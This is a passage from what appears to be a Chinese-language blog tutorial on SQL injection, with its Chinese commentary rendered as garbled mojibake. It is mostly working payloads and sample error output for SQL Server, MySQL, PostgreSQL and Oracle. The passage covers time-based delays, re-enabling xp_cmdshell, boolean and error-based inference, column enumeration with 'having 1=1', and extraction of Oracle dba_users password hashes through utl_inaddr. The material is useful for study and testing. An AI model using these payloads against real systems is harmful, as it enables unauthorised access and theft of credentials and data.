class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- sql server 2000</span><span class="token keyword">exec</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>sp_addextendedproc <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> <span class="token string">'xplog70.dll'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell <span class="token string">'ping -n 5 127.0.0.1'</span><span class="token comment">-- pingå›è·¯5s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> benchmark<span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">,</span>sha1<span class="token punctuation">(</span><span class="token string">'blah'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- æ‰§è¡Œåé¢çš„è¯­å¥1000000æ¬¡</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- ç¡çœ 5s é…åˆifä½¿ç”¨</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> pg_sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- unix</span><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FUNCTION</span> sleep <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token keyword">RETURNS</span> <span class="token keyword">int</span> <span class="token keyword">AS</span> <span class="token string">'/lib/libc.so.6'</span><span class="token punctuation">,</span><span class="token string">'sleep'</span> <span class="token keyword">language</span> <span class="token string">'C'</span> STRICT<span class="token punctuation">;</span> <span class="token keyword">SELECT</span> sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="oracle"><a href="#oracle" class="headerlink" title="oracle"></a>oracle</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> utl_http<span class="token punctuation">.</span>request <span class="token punctuation">(</span><span class="token string">' http://10.0.0.1/ '</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span> <span class="token keyword">select</span> HTTPURITYPE<span class="token punctuation">(</span><span class="token string">' http://10.0.0.1/ '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getclob<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span><span class="token comment">-- ä½¿ç”¨UTL HTTPæˆ–HTTPURITYPEå‘ä¸€ä¸ª'æ­»çš„'IPåœ°å€å‘é€ä¸€ä¸ªHTTPè¯·æ±‚æŸ¥è¯¢å°†ä¸€ç›´ç­‰å¾…è¿æ¥ç›´åˆ°è¶…æ—¶</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> decode<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> all_objects<span class="token punctuation">,</span>all_objects<span class="token punctuation">,</span>all_objects<span class="token punctuation">,</span>all_objects<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">-- ç¬›å¡å°”ç§¯</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="åŸºäºé”™è¯¯"><a href="#åŸºäºé”™è¯¯" class="headerlink" title="åŸºäºé”™è¯¯"></a>åŸºäºé”™è¯¯</h4><p>è¿”å›ä¸¤ç§çŠ¶æ€ï¼Œå…¶ä¸­ä¸€ç§çŠ¶æ€æ˜¯é”™è¯¯</p><p>sql server</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12/is_srvrolemember('sysadmin')</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>is_srvrolemember()æ˜¯SQL Server T-SQLçš„ä¸€ä¸ªå‡½æ•°ï¼Œè¿”å›</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>ï¼šå¦‚æœç”¨æˆ·å±äºæŒ‡å®šçš„ç»„ã€‚<span class="token number">0</span>ï¼šå¦‚æœç”¨æˆ·ä¸å±äºæŒ‡å®šçš„ç»„ã€‚NULLï¼šå¦‚æœæŒ‡å®šçš„ç»„ä¸å­˜åœ¨ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ„æ€å¾ˆæ˜ç¡®ï¼Œè¿”å›1çš„è¯å°±ä¼šæ‹¼æ¥æˆ12/1,id=12ä¼šè¿”å›ç»“æœï¼Œ0åˆ™æŠ¥é”™ï¼Œå…·ä½“æŠ¥é”™ä¸æ·±ç©¶</p><p>caseè¯­å¥ä¹Ÿèƒ½è¿™æ ·ä½¿ç”¨ï¼Œå †å ä¸èƒ½ç”¨å®ƒéƒ½èƒ½ç”¨</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12/(case+when+(system_user='sa')+then+1+else+0+end)</span>http:<span class="token comment">//sql/Less-2/?id=12/(if(1=1,1,0))</span>http:<span class="token comment">//sql/Less-2/?id=12/(case 1 when 1 then 1 else 0 end)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="åŸºäºå†…å®¹"><a href="#åŸºäºå†…å®¹" class="headerlink" title="åŸºäºå†…å®¹"></a>åŸºäºå†…å®¹</h4><p>æ‰§è¡Œè¯­å¥è¿”å›å†…å®¹å’Œä¸æ‰§è¡Œè¿”å›çš„å†…å®¹ä¸åŒï¼Œç›¸æ¯”äºåŸºäºæ—¶é—´ï¼ŒåŸºäºé”™è¯¯ä¼šæ›´å¿«ï¼ŒåŸºäºå†…å®¹ä¸ä¼šäº§ç”Ÿé”™è¯¯ï¼Œæœ‰ç‚¹ä¸è¨€è€Œå–»ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//sql/Less-2/?id=10%2B(if(1=1,1,0))</span><span class="token comment">-- è‹¥æˆåŠŸæ‰§è¡Œifè¯­å¥,å°±ä¼šè¿”å›id=11çš„ç»“æœï¼Œå¯¹æ¯”10ä¸åŒ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="å¤„ç†å­—ç¬¦ä¸²"><a href="#å¤„ç†å­—ç¬¦ä¸²" class="headerlink" title="å¤„ç†å­—ç¬¦ä¸²"></a>å¤„ç†å­—ç¬¦ä¸²</h4><p>å‰é¢ä»‹ç»çš„éƒ½æ˜¯æ•°å€¼ä¸Šçš„æŠ€æœ¯ï¼Œè¿™æ®µä»‹ç»å­—ç¬¦ä¸Šçš„æŠ€å·§</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12</span><span class="token comment">-- æ­£å¸¸æŸ¥è¯¢ï¼Œid=13æ—¶ç»“æœä¸ºç©ºï¼Œsqlè¯­å¥ä¸º</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'12'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=1'%2B'2</span><span class="token comment">-- ç»“æœå’Œä¸Šé¢ç›¸åŒï¼Œå› ä¸ºè¿æ¥æˆäº†12</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿™æ—¶å¯ä»¥å°†char()å‡½æ•°æ”¾åœ¨2çš„ä½ç½®æµ‹è¯•</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=1'%2Bchar(50)'</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span><span class="token operator">+</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ‰§è¡Œç»“æœå’Œå‰é¢ç›¸åŒï¼Œè¿™æ˜¯å¯ä»¥å°†æ¡ä»¶è¯­å¥æ’å…¥2çš„ä½ç½®</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=1'%2Bchar(49%2B(case+when+(system_user+=+'sa')+then+l+else+0+end))'</span><span class="token comment">-- å¦‚æœæ˜¯saæ‰§è¡Œåid=13ï¼Œä¸æ˜¯åˆ™id=12</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ ¹æ®ç»“æœçš„ä¸åŒå¯ä»¥åˆ¤æ–­æ¡ä»¶</p><h4 id="æ‹“å±•æ”»å‡»"><a href="#æ‹“å±•æ”»å‡»" class="headerlink" title="æ‹“å±•æ”»å‡»"></a>æ‹“å±•æ”»å‡»</h4><p>ç®€è€Œè¨€ä¹‹ï¼Œä¸åœ¨å±€é™äºåˆ¤æ–­saç”¨æˆ·äº†ï¼Œè€Œæ˜¯å¾—åˆ°æ‰€æœ‰ä¿¡æ¯ï¼Œå…ˆå¾—åˆ°ç”¨æˆ·åé•¿åº¦</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12/(case+when+(len(system_user)+&gt;+16)+then+1+else+0+end)</span>http:<span class="token comment">//test/?id=12/(case+when+(len(system_user)+&gt;+12)+then+1+else+0+end)</span>http:<span class="token comment">//test/?id=12/(case+when+(len(system_user)+&gt;+10)+then+1+else+0+end)</span><span class="token comment">-- äºŒåˆ†æŸ¥æ‰¾ï¼Œé”™è¯¯å’ŒæˆåŠŸçš„äº¤ç•Œå°±æ˜¯æ­£ç¡®çš„å€¼</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹ä¸€æ¬¡æŸ¥æ‰¾ç»„æˆç”¨æˆ·åçš„æ¯ä¸ªå€¼</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//test/?id=12/(case+when+(ascii(substring(select+system_user),1,1))+&gt;+64)+then+1+else+0+end)</span><span class="token comment">-- äºŒåˆ†æŸ¥æ‰¾</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿™äº›è¿‡ç¨‹ä¸€èˆ¬éƒ½äº¤ç»™è‡ªåŠ¨åŒ–è„šæœ¬</p><h4 id="åˆ©ç”¨SQLæ³¨å…¥é”™è¯¯"><a href="#åˆ©ç”¨SQLæ³¨å…¥é”™è¯¯" class="headerlink" title="åˆ©ç”¨SQLæ³¨å…¥é”™è¯¯"></a>åˆ©ç”¨SQLæ³¨å…¥é”™è¯¯</h4><p>å°†æ£€ç´¢çš„ä¿¡æ¯æ³¨å…¥è¿›æŠ¥é”™ä¿¡æ¯ä¸­</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/products.asp?id=system_user</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Microsoft OLE DB Provider <span class="token keyword">for</span> ODBC Drivers error <span class="token string">'80040e07'</span> <span class="token punctuation">[</span>Microsoft<span class="token punctuation">]</span><span class="token punctuation">[</span>ODBC SQL Server Driver<span class="token punctuation">]</span><span class="token punctuation">[</span>SQL Server<span class="token punctuation">]</span>Conversion failed when converting the nvarchar value <span class="token string">'appdbuser'</span> to data <span class="token builtin class-name">type</span> int./products.asp, line <span class="token number">33</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>appdbuser</code>å¾ˆæ˜æ˜¾è¿™ä¸ªè¿”å›èƒ½åšæ–‡ç« ï¼Œä½¿ç”¨å‰é¢æåˆ°çš„<code>is_srvrolemember</code>çš„è¿”å›å€¼å¼ºåˆ¶ç±»å‹è½¬æ¢</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/products.asp?id=char(65%2Bis_srvrolemember('sysadmin'))</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Microsoft OLE DB Provider <span class="token keyword">for</span> ODBC Drivers error <span class="token string">'80040e07'</span> <span class="token punctuation">[</span>Microsoft<span class="token punctuation">]</span><span class="token punctuation">[</span>ODBC SQL Server Driver<span class="token punctuation">]</span><span class="token punctuation">[</span>SQL Server<span class="token punctuation">]</span>Conversion failed when converting the nvarchar value <span class="token string">'B'</span> to data <span class="token builtin class-name">type</span> int. /products.asp, line <span class="token number">33</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¦‚æœå½“å‰ç”¨æˆ·ä¸å±äºsysadminç»„ï¼Œé‚£ä¹ˆis srvrolememberå°†è¿”å›0ï¼Œchar(65+0)å°†è¿”å›å­—æ¯A,å¦‚æœå½“å‰ç”¨æˆ·æ‹¥æœ‰ç®¡ç†å‘˜æƒé™ï¼Œé‚£ä¹ˆis_srvrolememberå°†è¿”å›1, char(65+1)å°†è¿”å›å­—æ¯Bã€‚</p><p><code>having 1=1</code>åŸºäºæŠ¥é”™ï¼Œæšä¸¾å½“å‰æŸ¥è¯¢ç”¨å¾—åˆ—åï¼Œé€šå¸¸å’Œ<code>group by</code>ä¸€èµ·ä½¿ç”¨ï¼Œgroup byå°†å·²æŸ¥è¯¢åˆ°çš„åˆ—å»é™¤ï¼Œå†æ¬¡æšä¸¾ç°åœ¨ç¬¬ä¸€åˆ—ï¼Œsql serverèƒ½äº§ç”Ÿç¬¬ä¸€åˆ—é”™è¯¯ä¿¡æ¯</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/products.asp?id=1+having+1=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Microsoft OLE DB Provider <span class="token keyword">for</span> ODBC Drivers error <span class="token string">'80040e14'</span><span class="token punctuation">[</span>Microsoft<span class="token punctuation">]</span><span class="token punctuation">[</span>ODBC SQL Server Driver<span class="token punctuation">]</span><span class="token punctuation">[</span>SQL Server<span class="token punctuation">]</span>Column <span class="token string">'products.id'</span> is invalid <span class="token keyword">in</span> the <span class="token keyword">select</span> list because it is not contained <span class="token keyword">in</span> either an aggregate <span class="token keyword">function</span> or the GROUP BY clause./products.asp, line <span class="token number">233</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>products.id</code>å°±æ˜¯ç¬¬ä¸€æ¡åˆ—åï¼Œè¦æŸ¥è¯¢ç¬¬äºŒæ¡</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/products.asp?id=1+group+by+products.id+having+1=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Microsoft OLE DB Provider <span class="token keyword">for</span> ODBC Drivers error <span class="token string">'80040e14'</span> <span class="token punctuation">[</span>Microsoft<span class="token punctuation">]</span> <span class="token punctuation">[</span>ODBC <span class="token keyword">SQL</span> Server Driver<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">SQL</span> Server<span class="token punctuation">]</span><span class="token keyword">Column</span> <span class="token string">'products.name'</span> <span class="token operator">is</span> invalid <span class="token operator">in</span> the <span class="token keyword">select</span> list because it <span class="token operator">is</span> <span class="token operator">not</span> contained <span class="token operator">in</span> either an aggregate <span class="token keyword">function</span> <span class="token operator">or</span> the <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> clause<span class="token punctuation">.</span><span class="token operator">/</span>shop<span class="token punctuation">.</span>asp<span class="token punctuation">,</span> line <span class="token number">233</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç¬¬ä¸€åˆ—å±äºGROUP BYå­å¥ï¼Œå› è€Œè¯¥é”™è¯¯ç°åœ¨ç”±ç¬¬äºŒåˆ—products.nameè§¦å‘ã€‚æ¥ä¸‹æ¥å°†è¯¥åˆ—æ·»åŠ åˆ°GROUP BYå­å¥ï¼Œä¸éœ€è¦æ¸…é™¤å‰é¢çš„å†…å®¹</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/shop.asp?id=1+group+by+products.id,products.name+having+1=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Oracleä¸­çš„é”™è¯¯ä¿¡æ¯"><a href="#Oracleä¸­çš„é”™è¯¯ä¿¡æ¯" class="headerlink" title="Oracleä¸­çš„é”™è¯¯ä¿¡æ¯"></a>Oracleä¸­çš„é”™è¯¯ä¿¡æ¯</h4><p><code>utl_inaddr</code>ï¼Œè¯¥å‡½æ•°è´Ÿè´£è§£æä¸»æœºå</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> utl_inaddr<span class="token punctuation">.</span>get_host_name<span class="token punctuation">(</span><span class="token string">'victim'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span>ORA<span class="token operator">-</span><span class="token number">29257</span> : host victim unknownORA<span class="token operator">-</span><span class="token number">06512</span>: at <span class="token string">"SYS.UTL_INADDR"</span><span class="token punctuation">,</span> line <span class="token number">4</span>ORA<span class="token operator">-</span><span class="token number">06512</span>: at <span class="token string">"SYS.UTL_INADDR"</span><span class="token punctuation">,</span> line <span class="token number">35</span>ORA<span class="token operator">-</span><span class="token number">06512</span>: at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…³æ³¨victimï¼Œå’Œå‰é¢å°èŠ‚ä¸€æ ·ï¼Œå‘utl_inaddrä¼ å…¥çš„éƒ½ä¼šæ˜¾ç¤ºåœ¨é”™è¯¯ä¸­</p><p>ç”¨selectè¯­å¥æ›¿æ¢victimï¼Œæœ‰ä¸ªé™åˆ¶ï¼šåªèƒ½è¿”å›ä¸€åˆ—å’Œä¸€è¡Œï¼Œå¦è€…ä¼šæ”¶åˆ°å¦ä¸€ç§æŠ¥é”™ä¿¡æ¯ORA-01427é”™è¯¯æ¶ˆæ¯ï¼šsingle-row subquery returns more than one rowã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> utl_inaddr<span class="token punctuation">.</span>get_host_name<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> username<span class="token operator">||</span><span class="token string">'='</span><span class="token operator">||</span>password <span class="token keyword">from</span> dba_users <span class="token keyword">where</span> rownum<span class="token operator">=</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span>ORA<span class="token operator">-</span><span class="token number">29257</span>: host SYS<span class="token operator">=</span>D4DF7931AB130E37 unknownORA<span class="token operator">-</span><span class="token number">06512</span>: at <span class="token string">"SYS.UTLâ€”INADDR"</span><span class="token punctuation">,</span> line <span class="token number">4</span>ORA<span class="token operator">-</span><span class="token number">06512</span>: at <span class="token string">"SYS.UTLâ€”INADDR"</span><span class="token punctuation">,</span> line <span class="token number">35</span>ORA<span class="token operator">-</span><span class="token number">06512</span>: at line <span class="token number">1</span><span class="token keyword">select</span> utl_inaddr<span class="token punctuation">.</span>get_host_name<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> banner <span class="token keyword">from</span> v$version <span class="token keyword">where</span> rownum<span class="token operator">=</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span>ORA<span class="token operator">-</span><span class="token number">29257</span>: host ORACLE <span class="token keyword">DATABASE</span> <span class="token number">10</span>G <span class="token keyword">RELEASE</span> <span class="token number">10.2</span><span class="token number">.0</span><span class="token number">.1</span><span class="token number">.0</span> <span class="token operator">-</span> <span class="token number">64</span>BIT PRODUCTION unknownORA<span class="token operator">-</span><span class="token number">06512</span>: at <span class="token string">"SYS.UTLâ€”INADDR"</span><span class="token punctuation">,</span> line <span class="token number">4</span>ORA<span class="token operator">-</span><span class="token number">06512</span>: at <span class="token string">"SYS.UTLâ€”INADDR"</span><span class="token punctuation">,</span> line <span class="token number">35</span>ORA<span class="token operator">-</span><span class="token number">06512</span>: at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>rownum=1æ˜¯æ§åˆ¶è¿”å›ç¬¬å‡ æ¡ï¼Œä¸ç„¶ä¸èƒ½å¾—åˆ°é¢„æœŸç»“æœï¼Œ||ç®¡é“ç¬¦æ‹¼æ¥åˆ™æ˜¯ç»•è¿‡åªèƒ½è¿”å›ä¸€åˆ—çš„é™åˆ¶</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username<span class="token operator">||</span><span class="token string">'='</span><span class="token operator">||</span>password <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> rownum r<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password <span class="token keyword">from</span> dba_users<span class="token punctuation">)</span> <span class="token keyword">where</span> r<span class="token operator">=</span><span class="token number">1</span>ORA<span class="token operator">-</span><span class="token number">29257</span>: host SYS<span class="token operator">=</span>D4DF7931AB130E37 unknown<span class="token comment">-- ä¸ºé¿å…æ‰€è¿æ¥çš„å­—ç¬¦ä¸²ä¸­å‡ºç°å•å¼•å·ï¼Œå¯é€‰ç”¨concatå‡½æ•°ï¼š</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span>concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span>chr<span class="token punctuation">(</span><span class="token number">61</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> rownum r<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password <span class="token keyword">from</span> dba_users<span class="token punctuation">)</span> <span class="token keyword">where</span> r<span class="token operator">=</span><span class="token number">2</span>ORA<span class="token operator">-</span><span class="token number">29257</span>: host SYSTEM<span class="token operator">=</span>E45049312A231FD1 unknown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»•è¿‡å•è¡Œé™åˆ¶ä»¥è·å–å¤šè¡Œä¿¡æ¯ã€‚å¯é€šè¿‡ä½¿ç”¨å¸¦XMLçš„ä¸“ç”¨SQLè¯­å¥æˆ–ä¸“ç”¨çš„Oracleå‡½æ•°stragg(11g+)æ¥åœ¨å•è¡Œä¸­è·å–æ‰€æœ‰è¡Œ,ä¸Šè¿°ä¸¤ç§æ–¹æ³•å”¯ä¸€çš„é™åˆ¶æ˜¯è¾“å‡ºå¤§å°(æœ€å¤§ä¸º 4000å­—èŠ‚)ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> xmltransform<span class="token punctuation">(</span>sys_xmlagg<span class="token punctuation">(</span>sys_xmlgen<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>xmltype<span class="token punctuation">(</span><span class="token string">'&lt;?xml version="l.0"?&gt;&lt;xsl:stylesheet version="l.0"xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;&lt;xsl:template match:"/"&gt;&lt;xsl:for-each select="/ROWSET/USERNAME"&gt;&lt;xsl:value-of select="text()"/&gt;;&lt;/xsl:for-each&lt;/xsl:template &lt;/xsl:stylesheet&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getstringval<span class="token punctuation">(</span><span class="token punctuation">)</span> listagg <span class="token keyword">from</span> all_users<span class="token punctuation">;</span><span class="token keyword">select</span> sys<span class="token punctuation">.</span>stragg<span class="token punctuation">(</span><span class="token keyword">distinct</span> username<span class="token operator">||</span><span class="token string">';'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> all_users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™æ®µä»£ç æ³¨å…¥utl_inaddrä¸­ï¼Œå°±ä¼šè¾“å‡ºæ‰€æœ‰ç”¨æˆ·åï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ALEX<span class="token punctuation">;</span>ANONYMOUS<span class="token punctuation">;</span>APEX_PUBLIC_USER<span class="token punctuation">;</span>CTXSYS<span class="token punctuation">;</span>DBSNMP<span class="token punctuation">;</span>DEMO1<span class="token punctuation">;</span>DIP<span class="token punctuation">;</span>DUMMY<span class="token punctuation">;</span>EXFSYS<span class="token punctuation">;</span>FLOWS_030000<span class="token punctuation">;</span>FLOWS_FILES<span class="token punctuation">;</span>MDDATA<span class="token punctuation">;</span>MDSYS<span class="token punctuation">;</span>MGMT_VIEW<span class="token punctuation">;</span>MONODEMO<span class="token punctuation">;</span>OLAPSYS<span class="token punctuation">;</span>ORACLE_OCM<span class="token punctuation">;</span>ORDPLUGINS<span class="token punctuation">;</span>ORDSYS<span class="token punctuation">;</span>OUTLN<span class="token punctuation">;</span>OWBSYS<span class="token punctuation">;</span>PHP<span class="token punctuation">;</span>PLSQL<span class="token punctuation">;</span>SCOTT<span class="token punctuation">;</span>SI_INFORMTN_SCHEMA<span class="token punctuation">;</span>SPATIAL_CSW_ADMIN_USR<span class="token punctuation">;</span>SPATIAL_WFS_ADMIN_USR<span class="token punctuation">;</span>SYS<span class="token punctuation">;</span>SYSMAN<span class="token punctuation">;</span>SYSTEM<span class="token punctuation">;</span>TSMSYS<span class="token punctuation">;</span>WKPROXY<span class="token punctuation">;</span>WKSYS<span class="token punctuation">;</span>WK_TEST<span class="token punctuation">;</span>WMSYS<span class="token punctuation">;</span>X<span class="token punctuation">;</span>XDB<span class="token punctuation">;</span>XS<span class="token variable">$NULL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œoracle llgé€šè¿‡ACLæ¥é™åˆ¶å¯¹utl_inaddrå’Œå…¶ä»–ç½‘ç»œåŒ…è®¿é—®ï¼Œè¿™æ—¶ä¼šå¾—åˆ°æŠ¥é”™network access denied by access control listï¼Œè¿™ç§æƒ…å†µæˆ–è€…utl_inaddrå–æ¶ˆäº†publicæƒé™ï¼Œå°±è¦å¦å¤–ç”¨å…¶ä»–å‡½æ•°äº†ï¼Œä¸‹é¢åˆ—ä¸¾å‡½æ•°</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#æ³¨å…¥ä¸‹åˆ—å†…å®¹:</span>Or <span class="token assign-left variable">1</span><span class="token operator">=</span>ORDSYS.ORD_DICOM.GETMAPPINGXPATH<span class="token punctuation">(</span>user,<span class="token string">'a'</span>,<span class="token string">'b'</span><span class="token punctuation">)</span>-- <span class="token comment">#è¿”å›ä¸‹åˆ—å†…å®¹ï¼š</span>ORA-53044: invalid tag: VICTIMUSER<span class="token comment">#æ³¨å…¥ä¸‹åˆ—å†…å®¹ï¼š</span>or <span class="token assign-left variable">1</span><span class="token operator">=</span>SYS.DBMS_AW_XML.READAWMETADATA<span class="token punctuation">(</span>user,<span class="token string">'a'</span><span class="token punctuation">)</span>-- <span class="token comment">#è¿”å›ä¸‹åˆ—å†…å®¹ï¼š</span>ORA-29532: Java call terminated by uncaught Java exception: oracle.AWXML.AWException: oracle.AWXML.AWException: An error has occurred, on the serverError class: Express FailureServer error descriptions:ENG: ORA-34344: Analytic workspace VICTIMUSER is not attached.<span class="token comment">#æ³¨å…¥ä¸‹åˆ—å†…å®¹ï¼š</span>Or <span class="token assign-left variable">1</span><span class="token operator">=</span> CTXSYS.CTX_QUERY.CHK_XPATH<span class="token punctuation">(</span>user,<span class="token string">'a'</span>,<span class="token string">'b'</span><span class="token 